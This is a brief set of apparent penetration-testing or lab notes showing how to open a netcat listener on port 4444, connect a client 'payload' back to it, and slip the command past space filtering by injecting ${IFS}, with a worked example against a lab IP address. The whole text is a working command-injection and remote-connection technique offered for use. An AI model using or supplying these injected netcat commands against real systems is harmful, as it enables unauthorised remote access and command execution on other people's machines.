Set up a listener 

$nc -l -v -p 4444 

~set up the client payload  
$ nc -nv server IP 4444 

To take out white space inject 

${IFS} 

example 

$ nc${IFS}-nv${IFS}10.129.91.66${IFS}4444